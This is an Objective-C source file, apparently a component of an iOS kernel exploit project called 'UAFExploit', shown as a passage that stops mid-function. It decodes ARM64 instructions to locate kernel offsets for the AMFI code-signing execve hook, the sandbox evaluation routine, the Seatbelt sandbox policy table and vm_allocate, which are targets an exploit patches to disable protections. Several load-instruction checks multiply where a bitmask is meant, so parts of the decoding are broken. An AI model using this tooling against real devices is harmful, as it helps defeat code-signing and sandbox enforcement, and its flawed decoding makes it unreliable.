//
//  patchfinder64.m
//  UAFExploit
//
//  Created by Vladimir Putin on 14.12.16.
//  Fixes by Alex Hude and Max Bazaliy
//  Some parts of code from Luca Todesco and Pangu
//  Copyright © 2016 -2017 FriedApple Team. All rights reserved.
//

#import <Foundation/Foundation.h>

#include "patchfinder64.h"

#define DEBUG_EXTENDED 0
#define DEBUG_ENABLED 1

#if DEBUG_EXTENDED
#   define PFExtLog(...) printf(__VA_ARGS__)
#else
#   define PFExtLog(x, ...)
#endif

#if DEBUG_ENABLED
#   define PFLog(...) printf(__VA_ARGS__)
#else
#   define PFLog(x, ...)
#endif

uint64_t Patchfinder64_(char* n, uint64_t (*x)(uint64_t region, uint8_t* kdata, size_t ksize), uint64_t region, uint8_t* kdata, size_t ksize) {
    uint64_t ret = x(region, kdata, ksize);
    if (!ret) {
        printf("couldn't find %s\n", n);
        sleep(5000);
    } else {
        if (ret >= ksize) {
            printf("warning! ret doesn't look like kernel offset (%#llx)\n", ret);
        }
    }
    return ret;
}

__unused static uint32_t bit_range_64(uint32_t x, int start, int end)
{
    x = (x << (31 - start)) >> (31 - start);
    x = (x >> end);
    return x;
}

__unused static uint64_t real_signextend_64(uint64_t imm, uint8_t bit)
{
    if ((imm >> bit) & 1) {
        return (-1LL << (bit + 1)) + imm;
    } else
        return imm;
}

__unused static uint64_t signextend_64(uint64_t imm, uint8_t bit)
{
    assert(bit > 0);
    return real_signextend_64(imm, bit - 1);
    /*
     if ((imm >> bit) & 1)
     return (uint64_t)(-1) - (~((uint64_t)1 << bit)) + imm;
     else
     return imm;
     */
}

__unused static int insn_is_mov_reg64(uint32_t* i)
{
    return (*i & 0x7FE003E0) == 0x2A0003E0;
}

__unused static int insn_mov_reg_rt64(uint32_t* i)
{
    return (*i >> 16) & 0x1F;
}

__unused static int insn_mov_reg_rd64(uint32_t* i)
{
    return *i & 0x1F;
}

__unused static int insn_is_movz_64(uint32_t* i)
{
    return (*i & 0x7F800000) == 0x52800000;
}

__unused static int insn_movz_rd_64(uint32_t* i)
{
    return *i & 0x1F;
}

__unused static int insn_is_mov_imm_64(uint32_t* i)
{
    if ((*i & 0x7f800000) == 0x52800000)
        return 1;
    
    return 0;
}

__unused static int insn_mov_imm_rd_64(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static uint32_t insn_mov_imm_imm_64(uint32_t* i)
{
    return bit_range_64(*i, 20, 5);
}

__unused static uint32_t insn_movz_imm_64(uint32_t* i)
{
    return bit_range_64(*i, 20, 5);
}

__unused static int insn_is_ldr_literal_64(uint32_t* i)
{
    // C6.2.84 LDR (literal) LDR Xt
    if ((*i & 0xff000000) == 0x58000000)
        return 1;
    
    // C6.2.84 LDR (literal) LDR Wt
    if ((*i & 0xff000000) == 0x18000000)
        return 1;
    
    // C6.2.95 LDR (literal) LDRSW Xt
    if ((*i & 0xff000000) == 0x98000000)
        return 1;
    
    return 0;
}

static int insn_nop_64(uint32_t *i)
{
    return (*i == 0xD503201F);
}

__unused static int insn_add_reg_rm_64(uint32_t* i)
{
    return ((*i >> 16) & 0x1f);
}

__unused static int insn_ldr_literal_rt_64(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static uint64_t insn_ldr_literal_imm_64(uint32_t* i)
{
    uint64_t imm = (*i & 0xffffe0) >> 3;
    return signextend_64(imm, 21);
}

__unused static uint64_t insn_adr_imm_64(uint32_t* i)
{
    uint64_t immhi = bit_range_64(*i, 23, 5);
    uint64_t immlo = bit_range_64(*i, 30, 29);
    uint64_t imm = (immhi << 2) + (immlo);
    return signextend_64(imm, 19+2);
}

__unused static uint64_t insn_adrp_imm_64(uint32_t* i)
{
    uint64_t immhi = bit_range_64(*i, 23, 5);
    uint64_t immlo = bit_range_64(*i, 30, 29);
    uint64_t imm = (immhi << 14) + (immlo << 12);
    return signextend_64(imm, 19+2+12);
}

__unused static int insn_is_adrp_64(uint32_t* i)
{
    if ((*i & 0x9f000000) == 0x90000000) {
        return 1;
    }
    
    return 0;
}

__unused static int insn_adrp_rd_64(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static int insn_is_mov_bitmask(uint32_t* i)
{
    return (*i & 0x7F8003E0) == 0x320003E0;
}

__unused static int insn_mov_bitmask_rd(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static int insn_is_add_imm_64(uint32_t* i)
{
    if ((*i & 0x7f000000) == 0x11000000)
        return 1;
    
    return 0;
}

__unused static int insn_add_imm_rd_64(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static int insn_add_imm_rn_64(uint32_t* i)
{
    return ((*i >> 5) & 0x1f);
}

__unused static uint64_t insn_add_imm_imm_64(uint32_t* i)
{
    uint64_t imm = bit_range_64(*i, 21, 10);
    if (((*i >> 22) & 3) == 1)
        imm = imm << 12;
    return imm;
}

__unused static int insn_add_reg_rd_64(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static int insn_add_reg_rn_64(uint32_t* i)
{
    return ((*i >> 5) & 0x1f);
}

__unused static int insn_is_add_reg_64(uint32_t* i)
{
    if ((*i & 0x7fe00c00) == 0x0b200000)
        return 1;
    
    return 0;
}

__unused static int insn_is_adr_64(uint32_t* i)
{
    if ((*i & 0x9f000000) == 0x10000000)
        return 1;
    
    return 0;
}

__unused static int insn_adr_rd_64(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static int insn_is_bl_64(uint32_t* i)
{
    if ((*i & 0xfc000000) == 0x94000000)
        return 1;
    else
        return 0;
}

__unused static int insn_is_strb(uint32_t* i)
{
    // TODO: more encodings
    return (*i >> 24 == 0x39);
}

__unused static int insn_rt_strb(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static int insn_rn_strb(uint32_t* i)
{
    return ((*i >> 5) & 0x1f);
}

__unused static int insn_strb_imm12(uint32_t* i)
{
    return ((*i >> 10) & 0xfff);
}

__unused static int insn_is_br_64(uint32_t *i)
{
    if ((*i & 0xfffffc1f) == 0xd61f0000)
        return 1;
    else
        return 0;
}

__unused static int insn_br_reg_xn_64(uint32_t *i)
{
    if ((*i & 0xfffffc1f) != 0xd61f0000)
        return 0;
    return (*i >> 5) & 0x1f;
}

__unused static uint64_t insn_bl_imm32_64(uint32_t* i)
{
    uint64_t imm = (*i & 0x3ffffff) << 2;
    //PFExtLog("imm = %llx\n", imm);
    // sign extend
    uint64_t res = real_signextend_64(imm, 27);
    
    //PFExtLog("real_signextend_64 = %llx\n", res);
    
    return res;
}

__unused static uint64_t insn_mov_bitmask_imm_64(uint32_t* i)
{
    // Extract the N, imms, and immr fields.
    uint32_t N = (*i >> 22) & 1;
    uint32_t immr = bit_range_64(*i, 21, 16);
    uint32_t imms = bit_range_64(*i, 15, 10);
    uint32_t j;
    
    int len = 31 - __builtin_clz((N << 6) | (~imms & 0x3f));
    
    uint32_t size = (1 << len);
    uint32_t R = immr & (size - 1);
    uint32_t S = imms & (size - 1);
    
    uint64_t pattern = (1ULL << (S + 1)) - 1;
    for (j = 0; j < R; ++j)
        pattern = ((pattern & 1) << (size-1)) | (pattern >> 1); // ror
    
    return pattern;
}

__unused int insn_is_funcbegin_64(uint32_t* i)
{
    if (*i == 0xa9bf7bfd)
        return 1;
    if (*i == 0xa9bc5ff8)
        return 1;
    if (*i == 0xa9bd57f6)
        return 1;
    if (*i == 0xa9ba6ffc)
        return 1;
    if (*i == 0xa9bb67fa)
        return 1;
    if (*i == 0xa9be4ff4)
        return 1;
    return 0;
}

__unused static int insn_is_tbz(uint32_t* i)
{
    return ((*i >> 24) & 0x7f) == 0x36;
}

__unused static int insn_is_cbz_w32(uint32_t* i)
{
    return (*i >> 24 == 0x34);
}

__unused static int insn_is_cbz_x64(uint32_t* i)
{
    return (*i >> 24 == 0xb4);
}

__unused static int insn_is_cbz_64(uint32_t* i)
{
    return ((*i >> 24) & 0x7f) == 0x34;
}

__unused static int insn_is_mrs_from_TPIDR_EL1(uint32_t* i)
{
    // op0 op1  CRn  CRm op2
    //  11 000 1101 0000 100
    //
    return ((*i & 0xFFFFFFF0) == 0xD538D080);
}

// search back for memory with step 4 bytes
__unused static uint32_t * memmem_back_64(uint32_t *ptr1, uint64_t max_count, const uint8_t *ptr2, size_t num)
{
    for ( uint64_t i = 0; i < max_count >> 2; ++i ) {
        if ( !memcmp(ptr1, ptr2, num) )
            return ptr1;
        --ptr1;
    }
    return 0;
}

uint32_t* find_literal_ref_64(uint64_t region, uint8_t* kdata, size_t ksize, uint32_t* insn, uint64_t address)
{
    uint32_t* current_instruction = insn;
    uint64_t registers[32];
    memset(registers, 0, sizeof(registers));
    
    while((uintptr_t)current_instruction < (uintptr_t)(kdata + ksize))
    {
        if (insn_is_mov_imm_64(current_instruction))
        {
            int reg = insn_mov_imm_rd_64(current_instruction);
            uint64_t value = insn_mov_imm_imm_64(current_instruction);
            registers[reg] = value;
            //PFExtLog("%s:%d mov (immediate): reg[%d] is reset to %#llx\n", __func__, __LINE__, reg, value);
        }
        else if (insn_is_ldr_literal_64(current_instruction))
        {
            uintptr_t literal_address  = (uintptr_t)current_instruction + (uintptr_t)insn_ldr_literal_imm_64(current_instruction);
            if(literal_address >= (uintptr_t)kdata && (literal_address + 4) <= ((uintptr_t)kdata + ksize))
            {
                int reg = insn_ldr_literal_rt_64(current_instruction);
                uint64_t value =  *(uint64_t*)(literal_address);
                registers[reg] = value;
                //PFExtLog("%s:%d ldr (literal): reg[%d] is reset to %#llx\n", __func__, __LINE__, reg, value);
            }
        }
        else if (insn_is_adrp_64(current_instruction))
        {
            int reg = insn_adrp_rd_64(current_instruction);
            uint64_t value = ((((uintptr_t)current_instruction - (uintptr_t)kdata) >> 12) << 12) + insn_adrp_imm_64(current_instruction);
            registers[reg] = value;
            //PFExtLog("%s:%d adrp: reg[%d] is reset to %#llx\n", __func__, __LINE__, reg, value);
        }
        else if (insn_is_adr_64(current_instruction))
        {
            uint64_t value = (uintptr_t)current_instruction - (uintptr_t)kdata + insn_adr_imm_64(current_instruction);
            if (value == address)
            {
                //PFExtLog("%s:%d FINAL pointer is %#llx\n", __func__, __LINE__, (uint64_t)current_instruction - (uint64_t)kdata);
                return current_instruction;
            }
        }
        else if(insn_is_add_reg_64(current_instruction))
        {
            int reg = insn_add_reg_rd_64(current_instruction);
            if(insn_add_reg_rm_64(current_instruction) == 15 && insn_add_reg_rn_64(current_instruction) == reg)
            {
                uint64_t value = ((uintptr_t)current_instruction - (uintptr_t)kdata) + 4;
                registers[reg] += value;
                //PFExtLog("%s:%d adrp: reg[%d] += %#llx\n", __func__, __LINE__, reg, value);
                if(registers[reg] == address)
                {
                    //PFExtLog("%s:%d FINAL pointer is %#llx\n", __func__, __LINE__, (uint64_t)current_instruction - (uint64_t)kdata);
                    return current_instruction;
                }
            }
        }
        else if (insn_is_add_imm_64(current_instruction))
        {
            int reg = insn_add_imm_rd_64(current_instruction);
            if (insn_add_imm_rn_64(current_instruction) == reg)
            {
                uint64_t value = insn_add_imm_imm_64(current_instruction);
                registers[reg] += value;
                //PFExtLog("%s:%d adrp: reg[%d] += %#llx\n", __func__, __LINE__, reg, value);
                if (registers[reg] == address)
                {
                    //PFExtLog("%s:%d FINAL pointer is %#llx\n", __func__, __LINE__, (uint64_t)current_instruction - (uint64_t)kdata);
                    return current_instruction;
                }
            }
            
        }
        
        current_instruction++;
    }
    
    //PFExtLog("%s:%d FINAL pointer is NULL\n", __func__, __LINE__);
    return NULL;
}

// search next instruction, incrementing mode
uint32_t* find_next_insn_matching_64(uint64_t region, uint8_t* kdata, size_t ksize, uint32_t* current_instruction, int (*match_func)(uint32_t*))
{
    while((uintptr_t)current_instruction < (uintptr_t)kdata + ksize - 4) {
        current_instruction++;
        
        if(match_func(current_instruction)) {
            return current_instruction;
        }
    }
    
    return NULL;
}

// search next instruction, decrementing mode
uint32_t* find_last_insn_matching_64(uint64_t region, uint8_t* kdata, size_t ksize, uint32_t* current_instruction, int (*match_func)(uint32_t*))
{
    while((uintptr_t)current_instruction > (uintptr_t)kdata) {
        current_instruction--;
        
        if(match_func(current_instruction)) {
            return current_instruction;
        }
    }
    
    return NULL;
}

__unused static int insn_is_ret(uint32_t* i)
{
    if (*i == 0xd65f03c0)
        return 1;
    
    return 0;
}

__unused static int insn_ldr_imm_rt_64(uint32_t* i)
{
    return (*i & 0x1f);
}

__unused static int insn_is_b_conditional_64(uint32_t* i)
{
    if ((*i & 0xff000010) == 0x54000000)
        return 1;
    else
        return 0;
}

__unused static int insn_is_b_unconditional_64(uint32_t* i)
{
    if ((*i & 0xfc000000) == 0x14000000)
        return 1;
    else
        return 0;
}

__unused static int insn_ldr_imm_rn_64(uint32_t* i)
{
    return ((*i >> 5) & 0x1f);
}

__unused static int insn_is_ldr_imm_64(uint32_t* i)
{
    // C6.2.83 LDR (immediate) Post-index
    if ((*i & 0xbfe00c00) == 0xb8400400)
        return 1;
    // C6.2.83 LDR (immediate) Pre-index
    if ((*i & 0xbfe00c00) == 0xb8400c00)
        return 1;
    // C6.2.83 LDR (immediate) Unsigned offset
    if ((*i & 0xbfc00000) == 0xb9400000)
        return 1;
    //------------------------------------//

    // C6.2.86 LDRB (immediate) Post-index
    if ((*i & 0xbfe00c00) == 0x38400400)
        return 1;
    // C6.2.86 LDRB (immediate) Pre-index
    if ((*i & 0xbfe00c00) == 0x38400c00)
        return 1;
    // C6.2.86 LDRB (immediate) Unsigned offset
    if ((*i & 0xbfc00000) == 0x39400000)
        return 1;
    //------------------------------------//
    
    // C6.2.90 LDRSB (immediate) Post-index
    if ((*i * 0xbfa00c00) == 0x38800400)
        return 1;
    // C6.2.90 LDRSB (immediate) Pre-index
    if ((*i * 0xbfa00c00) == 0x38800c00)
        return 1;
    // C6.2.90 LDRSB (immediate) Unsigned offset
    if ((*i * 0xbf800000) == 0x39800000)
        return 1;
    //------------------------------------//
    
    // C6.2.88 LDRH (immediate) Post-index
    if ((*i * 0xbfe00c00) == 0x78400c00)
        return 1;
    // C6.2.88 LDRH (immediate) Pre-index
    if ((*i * 0xbfe00c00) == 0x78400c00)
        return 1;
    // C6.2.88 LDRH (immediate) Unsigned offset
    if ((*i * 0xbfc00000) == 0x79400000)
        return 1;
    //------------------------------------//
    
    // C6.2.92 LDRSH (immediate) Post-index
    if ((*i * 0xbfa00c00) == 0x78800c00)
        return 1;
    // C6.2.92 LDRSH (immediate) Pre-index
    if ((*i * 0xbfa00c00) == 0x78800c00)
        return 1;
    // C6.2.92 LDRSH (immediate) Unsigned offset
    if ((*i * 0xbf800000) == 0x79800000)
        return 1;
    //------------------------------------//

    
    // C6.2.94 LDRSW (immediate) Post-index
    if ((*i * 0xbfe00c00) == 0xb8800400)
        return 1;
    // C6.2.94 LDRSW (immediate) Pre-index
    if ((*i * 0xbfe00c00) == 0xb8800c00)
        return 1;
    // C6.2.94 LDRSW (immediate) Unsigned offset
    if ((*i * 0xbfc00000) == 0xb9800000)
        return 1;
    
    return 0;
}

// TODO: other encodings
__unused static uint64_t insn_ldr_imm_imm_64(uint32_t* i)
{
    uint64_t imm;
    // C6.2.83 LDR (immediate) Post-index
    if ((*i & 0xbfe00c00) == 0xb8400400)
    {
        imm = bit_range_64(*i, 20, 12);
        return signextend_64(imm, 9);
    }
    
    // C6.2.83 LDR (immediate) Pre-index
    if ((*i & 0xbfe00c00) == 0xb8400c00)
    {
        imm = bit_range_64(*i, 20, 12);
        return signextend_64(imm, 9);
    }
    
    // C6.2.83 LDR (immediate) Unsigned offset
    if ((*i & 0xbfc00000) == 0xb9400000)
    {
        imm = bit_range_64(*i, 21, 10);
        if ((*i >> 30) & 1) // LDR X
            return imm * 8;
        else
            return imm * 4;
    }
    
    PFLog("Warning! Unsupported encoding or not LDR instruction is passed!\n");
    
    return 0;
}

bool uref;

uint64_t find_register_value(uint32_t *dataPointer, uint64_t count, uint64_t base, unsigned char reg)
{
    bool isRegisterSet[33];
    uint64_t registers[33];

    memset(registers, 0, sizeof(registers));
    for (uint64_t i = (count >> 2) - 32; ; ++i )
    {
        if ( i >= count >> 2 )
            break;
        uint32_t *insn = &dataPointer[i];
        if ( insn_is_mov_reg64(insn) )
        {
            registers[insn_mov_reg_rd64(insn)] = registers[insn_mov_reg_rt64(insn)];
            isRegisterSet[insn_mov_reg_rd64(insn)] = isRegisterSet[insn_mov_reg_rt64(insn)];
        }
        else if ( insn_is_movz_64(insn) )
        {
            registers[insn_movz_rd_64(insn)] = insn_movz_imm_64(insn);
            isRegisterSet[insn_movz_rd_64(insn)] = 0;
        }
        else if ( insn_is_adrp_64(insn) )
        {
            registers[insn_adrp_rd_64(insn)] = insn_adrp_imm_64(insn) + ((registers[32] >> 12) << 12);
            isRegisterSet[insn_adrp_rd_64(insn)] = 0;
        }
        else if ( insn_is_adr_64(insn) )
        {
            registers[insn_adr_rd_64(insn)] = insn_adr_imm_64(insn) + registers[32];
            isRegisterSet[insn_adr_rd_64(insn)] = 0;
        }
        else if ( insn_is_ldr_literal_64(insn) )
        {
            registers[insn_ldr_literal_rt_64(insn)] = insn_ldr_literal_imm_64(insn);
            isRegisterSet[insn_ldr_literal_rt_64(insn)] = 1;
        }
        else if ( insn_is_ldr_imm_64(insn) )
        {
            registers[insn_ldr_imm_rt_64(insn)] = registers[insn_ldr_imm_rn_64(insn)] + insn_ldr_imm_imm_64(insn);
            isRegisterSet[insn_ldr_imm_rt_64(insn)] = 1;
        }
        else if ( insn_is_add_imm_64(insn) )
        {
            registers[insn_add_imm_rd_64(insn)] = insn_add_imm_imm_64(insn) + registers[insn_add_imm_rn_64(insn)];
            isRegisterSet[insn_add_imm_rd_64(insn)] = 0;
        }
        else if ( insn_is_mov_bitmask(insn) )
        {
            registers[insn_mov_bitmask_rd(insn)] = insn_mov_bitmask_imm_64(insn);
            isRegisterSet[insn_mov_bitmask_rd(insn)] = 0;
        }
        else if ( insn_is_ret(insn) )
        {
            for ( int j = 0; j < 31; ++j )
            {
                registers[j] = 0;
                isRegisterSet[j] = 0;
            }
        }
    }
    uref = isRegisterSet[reg] != 0;
    return registers[reg];
}

// calculate value (if possible) of register before specific instruction
uint64_t find_pc_rel_value_64(uint64_t region, uint8_t* kdata, size_t ksize, uint32_t* last_insn, int reg)
{
    int found = 0;
    uint32_t* current_instruction = last_insn;
    while((uintptr_t)current_instruction > (uintptr_t)kdata)
    {
        current_instruction--;
        
        if(insn_is_mov_imm_64(current_instruction) && insn_mov_imm_rd_64(current_instruction) == reg)
        {
            found = 1;
            break;
        }
        
        if(insn_is_ldr_literal_64(current_instruction) && insn_ldr_literal_rt_64(current_instruction) == reg)
        {
            found = 1;
            break;
        }
        
        if (insn_is_adrp_64(current_instruction) && insn_adrp_rd_64(current_instruction) == reg)
        {
            found = 1;
            break;
        }
        
        if (insn_is_adr_64(current_instruction) && insn_adr_rd_64(current_instruction) == reg)
        {
            found = 1;
            break;
        }
    }
    if(!found)
        return 0;
    uint64_t value = 0;
    while((uintptr_t)current_instruction < (uintptr_t)last_insn)
    {
        if(insn_is_mov_imm_64(current_instruction) && insn_mov_imm_rd_64(current_instruction) == reg)
        {
            value = insn_mov_imm_imm_64(current_instruction);
            PFExtLog("%s:%d mov (immediate): value is reset to %#llx\n", __func__, __LINE__, value);
        }
        else if(insn_is_ldr_literal_64(current_instruction) && insn_ldr_literal_rt_64(current_instruction) == reg)
        {
            value = *(uint64_t*)((uintptr_t)current_instruction + insn_ldr_literal_imm_64(current_instruction));
            PFExtLog("%s:%d ldr (literal): value is reset to %#llx\n", __func__, __LINE__, value);
        }
        else if (insn_is_ldr_imm_64(current_instruction) && insn_ldr_imm_rn_64(current_instruction) == reg)
        {
            value += insn_ldr_imm_imm_64(current_instruction);
            PFExtLog("%s:%d ldr (immediate): value = %#llx\n", __func__, __LINE__, value);
        }
        if (insn_is_adrp_64(current_instruction) && insn_adrp_rd_64(current_instruction) == reg)
        {
            value = ((((uintptr_t)current_instruction - (uintptr_t)kdata) >> 12) << 12) + insn_adrp_imm_64(current_instruction);
            PFExtLog("%s:%d adrp: value is reset to %#llx\n", __func__, __LINE__, value);
        }
        else if (insn_is_adr_64(current_instruction) && insn_adr_rd_64(current_instruction) == reg)
        {
            value = (uintptr_t)current_instruction - (uintptr_t)kdata + insn_adr_imm_64(current_instruction);
            PFExtLog("%s:%d adr: value is reset to %#llx\n", __func__, __LINE__, value);
        }
        else if(insn_is_add_reg_64(current_instruction) && insn_add_reg_rd_64(current_instruction) == reg)
        {
            if (insn_add_reg_rm_64(current_instruction) != 15 || insn_add_reg_rn_64(current_instruction) != reg)
            {
                PFExtLog("%s:%d add (register): unknown source register, value is reset to 0\n", __func__, __LINE__);
                return 0;
            }
            
            value += ((uintptr_t)current_instruction - (uintptr_t)kdata) + 4;
            PFExtLog("%s:%d add: PC register, value = %#llx\n", __func__, __LINE__, value);
        }
        else if (insn_is_add_imm_64(current_instruction) && insn_add_imm_rd_64(current_instruction) == reg)
        {
            if (insn_add_imm_rn_64(current_instruction) != reg)
            {
                PFExtLog("%s:%d add (immediate): unknown source register, value is reset to 0\n", __func__, __LINE__);
                return 0;
            }
            value += insn_add_imm_imm_64(current_instruction);
            PFExtLog("%s:%d add (immediate): value = %#llx\n", __func__, __LINE__, value);
        }
        
        current_instruction++;
    }
    PFExtLog("%s:%d FINAL value = %#llx\n", __func__, __LINE__, value);
    
    return value;
}

void* find_masked(uint8_t *kdata, size_t ksize, uint8_t *sequence, uint8_t *mask, size_t size)
{
    size_t min_size = 0;
    while (mask[min_size] == 0xFF)
        ++min_size;
    
    if (min_size) {
        uint8_t *search_ptr = kdata;
        while (search_ptr < kdata + ksize) {
            // find next occurance
            size_t remain_size = ksize - (search_ptr - kdata);
            uint8_t *ptr = (uint8_t *)memmem(search_ptr, remain_size, sequence, min_size);
            if (!ptr)
                return 0;
            
            // check remaining bytes with mask
            bool isFound = true;
            for (size_t i = min_size; i < size; ++i) {
                if ((ptr[i] & mask[i]) != sequence[i]) {
                    isFound = false;
                    break;
                }
            }
            
            if (isFound)
                return ptr;
            
            // continue search from here
            search_ptr = ptr + 1;
        }
    } else {
        size_t k = 0; // kernel read index
        size_t n = 0; // magic read index
        while (k < ksize) {
            if ((kdata[k] & mask[n]) != sequence[n]) {
                n = 0;
            } else {
                ++n;
                // check for matching size
                if (n == size) {
                    return kdata + k;
                }
            }
            ++k;
        }
    }
    
    return 0;
}

// extract address of the GOT item by BL instruction in the kernel extension
uint64_t find_GOT_address_with_bl_64(uint64_t region, uint8_t* kdata, size_t ksize, uint32_t *insn)
{
    // check if BL is specified
    if (!insn_is_bl_64(insn))
        return 0;
    
    // get address of GOT stub
    uint8_t* address = (uint8_t *)insn + insn_bl_imm32_64(insn);
    //PFLog("%s: address %p\n", __func__, (void *)(address - kdata + region));
    
    // find BR instruction
    uint32_t *instr = find_next_insn_matching_64(region, kdata, ksize, (uint32_t *)address, insn_is_br_64);
    if (!instr)
        return 0;
    //PFLog("%s: BR address %p\n", __func__, (void *)((uint8_t*)instr - kdata + region));
    
    // check if it's BR x16
    if (insn_br_reg_xn_64(instr) != 16)
        return 0;
    
    // get location of GOT - X16
    uint64_t GOT_address_value = find_pc_rel_value_64(region, kdata, ksize, instr, 16);
    if (!GOT_address_value)
        return 0;
    
    return GOT_address_value;
}

uint64_t find_printf_in_amfi_execve_hook(uint64_t region, uint8_t* kdata, size_t ksize)
{
    const char errString[] = "AMFI: hook..execve() killing pid %u: %s";
    uint8_t* errStringPtr = memmem(kdata, ksize, errString, sizeof(errString) - 1);
    if (!errStringPtr)
        return 0;
    //PFLog("%s: errStringPtr %p\n", __PRETTY_FUNCTION__, (void *)(errStringPtr - kdata + region));
    
    // now we have to find code in the kernel referencing to this error string
    uint32_t *adr_instr = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, errStringPtr - kdata);
    if (!adr_instr)
        return 0;
    //PFLog("%s: adr_instr %p\n", __PRETTY_FUNCTION__, (void *)((uint8_t*)adr_instr - kdata + region));
    
    // find 'BL _printf'
    uint8_t *bl_printf_ptr = (uint8_t *)find_next_insn_matching_64(region, kdata, ksize, adr_instr, insn_is_bl_64);
    if (!bl_printf_ptr)
        return 0;
    
    return (uint64_t)(bl_printf_ptr - kdata);
}

uint64_t find_vnode_isreg_in_amfi_execve_hook(uint64_t region, uint8_t* kdata, size_t ksize)
{
    const char errString[] = "AMFI: hook..execve() killing pid %u: %s";
    uint8_t* errStringPtr = memmem(kdata, ksize, errString, sizeof(errString) - 1);
    if (!errStringPtr)
        return 0;
    //PFLog("%s: errStringPtr %p\n", __PRETTY_FUNCTION__, (void *)(errStringPtr - kdata + region));
    
    // now we have to find code in the kernel referencing to this error string
    uint32_t *adr_instr = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, errStringPtr - kdata);
    if (!adr_instr)
        return 0;
    //PFLog("%s: adr_instr %p\n", __PRETTY_FUNCTION__, (void *)((uint8_t*)adr_instr - kdata + region));
    
    // find begining of function
    uint32_t *begin_execve_hook = find_last_insn_matching_64(region, kdata, ksize, adr_instr, insn_is_funcbegin_64);
    if (!begin_execve_hook)
        return 0;
    //PFLog("%s: execve_hook %p\n", __PRETTY_FUNCTION__, (void *)((uint8_t*)begin_execve_hook - kdata + region));
    
    // find 'BL vnode_isreg'
    uint32_t *bl_vnode_isreg = find_next_insn_matching_64(region, kdata, ksize, begin_execve_hook, insn_is_bl_64);
    if (!bl_vnode_isreg)
        return 0;
    
    // get bl_vnode_isreg address
    return find_GOT_address_with_bl_64(region, kdata, ksize, bl_vnode_isreg);
}

uint64_t find_sb_eval(uint64_t region, uint8_t* kdata, size_t ksize)
{
    const char specString[] = "rootless_entitlement";
    uint8_t* control_name = memmem(kdata, ksize, specString, sizeof(specString) / sizeof(*specString));
    if (!control_name)
        return 0;
    
    uint32_t* ref = find_literal_ref_64(region, kdata, ksize, (uint32_t*) kdata, (uintptr_t)control_name - (uintptr_t)kdata);
    if (!ref)
        return 0;
    
    uint32_t* fn_start = find_last_insn_matching_64(region, kdata, ksize, ref, insn_is_funcbegin_64);
    if (!fn_start)
        return 0;

    return ((uintptr_t)fn_start) - ((uintptr_t)kdata);
}

// find sandbox policy list
uint64_t find_sandbox_mac_policy_ops(uint64_t region, uint8_t* kdata, size_t ksize)
{
    char magicStr[] = "Seatbelt sandbox policy";
    
    // find `seatbelt` string
    uint32_t* magicStringPtr = memmem(kdata, ksize, magicStr, sizeof(magicStr) / sizeof(*magicStr));
    if (!magicStringPtr)
        return 0;
    //PFLog("magicStringPtr %p\n", magicStringPtr);
    
    uint64_t strAddress = (uintptr_t)magicStringPtr - (uintptr_t)kdata + region;
    uint64_t* ref = memmem(kdata, ksize, &strAddress, sizeof(strAddress));
    if (!ref)
        return 0;
    //PFLog("ref %p\n", ref);
    
    uint64_t sandbox_mac_policy_ops_ptr = *(ref + 3);
    return sandbox_mac_policy_ops_ptr - region;
}

// mac_policy_list
uint64_t find_mac_policy_list(uint64_t region, uint8_t* kdata, size_t ksize)
{
    //
    return 0;
}

uint64_t find_vm_allocate_812(uint64_t region, uint8_t* kdata, size_t ksize)
{
    uint8_t magic_value[] = { 0x09, 0x1F, 0xA0, 0x52, 0x89, 0xFD, 0x97, 0x72, 0x09, 0x01, 0x09, 0x0A };
    
    // find `flags & 0xF8BFEC` magic
    uint32_t* magicStringPtr = memmem(kdata, ksize, magic_value, sizeof(magic_value) / sizeof(*magic_value));
    if (!magicStringPtr)
        return 0;
    
    //PFLog("magicStringPtr offset %#lx\n", (uint8_t*)magicStringPtr - kdata);
    
    // we need second offset
    size_t remain_size = ksize - ((uint8_t*)magicStringPtr - kdata);
    magicStringPtr = memmem(magicStringPtr + 1, remain_size, magic_value, sizeof(magic_value) / sizeof(*magic_value));
    if (!magicStringPtr)
        return 0;

    //PFLog("magicStringPtr offset %#lx\n", (uint8_t*)magicStringPtr - kdata);
    
    // find function begining
    uint32_t *insn = find_last_insn_matching_64(region, kdata, ksize, magicStringPtr, insn_is_funcbegin_64);
    if (!insn)
        return 0;
    
    //PFLog("insn offset %#lx\n", (uint8_t*)insn - kdata);
    
    return ((uint8_t *)insn - kdata);
}

uint64_t find_vm_allocate(uint64_t region, uint8_t* kdata, size_t ksize)
{
    const char magicString[] = "sb_packbuff_alloc_vm_buffer";
    const char magicString2[] = "\"Init against 64b primordial proc";
    bool is_iOS8_case = false;
    uint8_t* magicStringPtr = memmem(kdata, ksize, magicString, sizeof(magicString) - 1);
    if (!magicStringPtr) {
        // iOS 8.x
        magicStringPtr = memmem(kdata, ksize, magicString2, sizeof(magicString2) - 1);
        // last attempt on fail
        if (!magicStringPtr)
            return find_vm_allocate_812(region, kdata, ksize);
        is_iOS8_case = true;
    }
    //PFLog("%s: magicStringPtr %p\n", __PRETTY_FUNCTION__, (void *)(magicStringPtr - kdata + region));
    
    // now we have to find code in the kernel referencing to this error string
    uint32_t *adr_instr = find_literal_ref_64(region, kdata, ksize, (uint32_t*)kdata, magicStringPtr - kdata);
    if (!adr_instr)
        return 0;
    //PFLog("%s: adr_instr %p\n", __PRETTY_FUNCTION__, (void *)((uint8_t*)adr_instr - kdata + region));
    
    // find 'BL _vm_allocate'
    uint32_t *bl_vm_allocate = find_last_insn_matching_64(region, kdata, ksize, adr_instr, insn_is_bl_64);
    if (!bl_vm_allocate)
        return 0;
    //PFLog("%s: bl_vm_allocate %p\n", __PRETTY_FUNCTION__, (void *)((uint8_t*)bl_vm_allocate - kdata + region));
    
    if (is_iOS8_case) {
        uint8_t* address = (uint8_t *)bl_vm_allocate + insn_bl_imm32_64(bl_vm_allocate);
        if (!address)
            return 0;
        //PFLog("address offset %p\n", (void *)(address - kdata));
        
        return (uint64_t)(address - kdata);
    }
    
    uint64_t vm_allocate_got = find_GOT_address_with_bl_64(region, kdata, ksize, bl_vm_allocate);
